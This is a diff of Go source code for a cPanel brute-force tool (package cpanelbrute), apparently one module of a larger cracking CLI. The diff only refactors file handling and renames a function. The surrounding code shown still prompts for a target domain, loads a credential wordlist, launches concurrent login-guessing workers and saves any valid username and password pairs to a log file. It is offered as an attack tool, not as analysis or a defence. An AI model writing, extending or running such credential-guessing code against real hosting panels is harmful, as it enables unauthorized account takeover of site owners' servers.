@@ -2,7 +2,7 @@ package cpanelbrute
 
 import (
 	"fmt"
-	"go_cli/smtpbrute"
+	"go_cli/fileutil"
 	"os"
 	"regexp"
 	"strings"
@@ -12,7 +12,7 @@ import (
 	"github.com/olekukonko/tablewriter"
 )
 
-func CpanelCrack() {
+func CpanelBrute() {
 	var target string
 	fmt.Println("Enter the CPanel Domain (example: https://website.com:2083/)")
 	fmt.Print(">>> ")
@@ -38,7 +38,7 @@ func CpanelCrack() {
 		return
 	}
 	fmt.Printf("filePath: %v\n", filePath)
-	wordlist, err := smtpbrute.ReadCredsFromFile(filePath)
+	wordlist, err := fileutil.ReadFromFile(filePath)
 	if err != nil {
 		fmt.Printf("err: %v\n", err)
 		return
@@ -59,11 +59,11 @@ func CpanelCrack() {
 	table := tablewriter.NewWriter(os.Stdout)
 	table.SetHeader([]string{"Domain", "Username", "Password"})
 
-	file := ResultsToFile()
+	file := fileutil.WriteToFile("cpanel_logs", "valid_logs.txt")
 
 	for i := 0; i < maxWorkers; i++ {
 		wg.Add(1)
-		go HandleBrute(trimedTarget, wordlistChunks, &wg, &mutex, table, &file)
+		go HandleBrute(trimedTarget, wordlistChunks, &wg, &mutex, table, file)
 	}
 
 	for i := 0; i < len(wordlist); i += chunkSize {
